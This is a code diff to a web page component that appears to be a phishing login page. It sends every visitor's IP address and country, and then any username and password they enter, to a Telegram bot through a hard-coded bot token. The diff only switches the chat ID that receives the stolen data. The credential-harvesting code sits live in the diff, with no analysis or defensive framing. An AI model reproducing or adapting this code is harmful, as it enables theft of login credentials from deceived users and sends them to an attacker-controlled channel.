@@ -18,7 +18,7 @@ export default function Home() {
           .then((res) => res.json())
           .then((data) => {
             const country = data.country_name;
-            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5824354578&parse_mode=markdown&text=*NEW SITE VISIT* %0A%0A*USER:* ${encodeURIComponent(ipAddress)} %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;
+            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5843268125&parse_mode=markdown&text=*NEW SITE VISIT* %0A%0A*USER:* ${encodeURIComponent(ipAddress)} %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;
 
             fetch(apiUrl)
               .then((res) => {
@@ -46,7 +46,7 @@ export default function Home() {
           .then((res) => res.json())
           .then((data) => {
             const country = data.country_name;
-            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5824354578&parse_mode=markdown&text=*USER:* ${encodeURIComponent(ipAddress)} %0A*LOGIN 1:* %0A%0A*Username:* ${encodeURIComponent(username)} %0A*Password:* ${encodeURIComponent(password)} %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;
+            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5843268125&parse_mode=markdown&text=*USER:* ${encodeURIComponent(ipAddress)} %0A*LOGIN 1:* %0A%0A*Username:* ${encodeURIComponent(username)} %0A*Password:* ${encodeURIComponent(password)} %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;
 
             fetch(apiUrl)
               .then((res) => {
